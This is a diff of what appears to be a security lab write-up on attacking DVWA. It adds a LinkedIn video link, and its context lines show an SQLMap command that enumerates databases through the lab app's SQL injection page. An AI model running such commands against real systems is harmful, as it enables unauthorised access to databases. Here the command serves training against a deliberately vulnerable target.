@@ -40,3 +40,6 @@ The main goal was to simulate real-world attack vectors (in a safe lab) and appl
 - Automated using *SQLMap*:
   ```bash
   sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx; security=low" --batch --dbs
+
+##  Linkedin Video Description:   
+   https://www.linkedin.com/posts/palak-baranwal-a98145337_cybersecurity-webapplicationsecurity-ethicalhacking-activity-7389360006103478272-1MJH?utm_source=social_share_send&utm_medium=android_app&rcm=ACoAAFSPZ9QBM7MH4wKOnhLjjQttu_AWlDqDMA0&utm_campaign=copy_link
